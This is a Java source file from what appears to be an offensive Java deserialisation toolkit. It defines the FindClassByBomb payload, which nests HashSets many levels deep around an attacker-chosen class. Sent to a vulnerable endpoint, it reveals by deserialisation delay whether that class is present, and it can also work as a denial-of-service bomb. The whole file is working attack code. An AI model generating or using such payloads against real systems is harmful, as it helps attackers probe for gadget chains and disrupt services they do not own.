package me.gv7.woodpecker.yso.payloads;

import javassist.*;
import me.gv7.woodpecker.yso.JavassistClassLoader;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.*;

@SuppressWarnings ( {
    "restriction"
} )
@Authors({ Authors.C0NY1 })
public class FindClassByBomb extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {
        int depth;
        String className = null;

        if(command.contains("|")){
            String[] x = command.split("\\|");
            className = x[0];
            depth = Integer.valueOf(x[1]);
        }else{
            className = command;
            depth = 28;
        }

        Class findClazz = makeClass(className);
        Set<Object> root = new HashSet<Object>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<Object>();
        for (int i = 0; i < depth; i++) {
            Set<Object> t1 = new HashSet<Object>();
            Set<Object> t2 = new HashSet<Object>();
            t1.add(findClazz);

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }

    public static HashMap<Object,Object> getBigList() throws Exception{
        Class findClazz = makeClass("xxxx");
        int depth = 0;
        HashMap<Object,Object> root = new HashMap<Object, Object>();
        HashMap<Object,Object> s1 = root;
        HashMap<Object,Object> s2 = new HashMap<Object,Object>();
        for (int i = 0; i < depth; i++) {
            HashMap<Object,Object> t1 = new HashMap<Object,Object>();
            HashMap<Object,Object> t2 = new HashMap<Object,Object>();

            t1.put(findClazz,t2);
            t2.put(findClazz,t1);

            s1.put(findClazz,t1);


            s1 = t1;
            s2 = t2;
        }




        return root;
    }



    public static Class loadClass(String clazzName) throws Exception{
        try{
            return Class.forName(clazzName);
        }catch (ClassNotFoundException e){
            try {
                return Thread.currentThread().getContextClassLoader().loadClass(clazzName);
            }catch (ClassNotFoundException ee){
                return makeClass(clazzName);
            }
        }
    }

    public static Class makeClass(String clazzName) throws Exception {
        if(clazzName.startsWith("java.")){
            return loadClass(clazzName);
        }
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass(new JavassistClassLoader());
        ctClass.defrost();
        return clazz;
    }
}
